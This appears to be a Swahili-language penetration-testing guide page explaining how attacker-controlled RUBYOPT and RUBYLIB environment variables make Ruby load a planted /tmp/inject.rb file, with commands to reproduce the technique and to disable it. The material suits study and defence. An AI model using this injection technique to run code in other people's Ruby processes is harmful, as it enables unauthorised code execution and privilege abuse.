# Uingizaji wa Ruby Applications kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby huchanganua switches zinazotumika za command-line kutoka kwenye environment variable ya `RUBYOPT` kabla ya kuendesha script. Ruby hukataa code execution kupitia `-e` katika `RUBYOPT`, lakini `-I` inaweza kuongeza library-search directory mwanzoni na `-r` inaweza kuhitaji library. Kwa hivyo, process inayoanzisha Ruby ikiwa na environment variables zinazodhibitiwa na attacker inaweza kulazimishwa kupakia Ruby code inayodhibitiwa na attacker.<sup>[[1]](#references)</sup>

Unda `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Unda hati ya Ruby isiyo na madhara kama vile `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Iendeshe kwa kutumia thamani iliyodhibitiwa ya `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ili kulemaza tabia hii, pitisha `--disable=rubyopt` (au `--disable-rubyopt`) **kabla ya** jina la script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Chaguo lililoandikwa baada ya `hello.rb` hupitishwa kwa script katika `ARGV`; halizuii uchakataji wa awali wa Ruby wa `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

Badala ya kutanguliza saraka ya upakiaji kwa `-I` ndani ya `RUBYOPT`, environment variable tofauti ya `RUBYLIB` huongeza saraka kwenye `$LOAD_PATH` ya Ruby. Ikiunganishwa na `RUBYOPT=-r<module>`, hupakia attacker code bila kuhitaji `-I` ndani ya `RUBYOPT`:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Nyaraka za Ruby - Chaguo za mstari wa amri](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
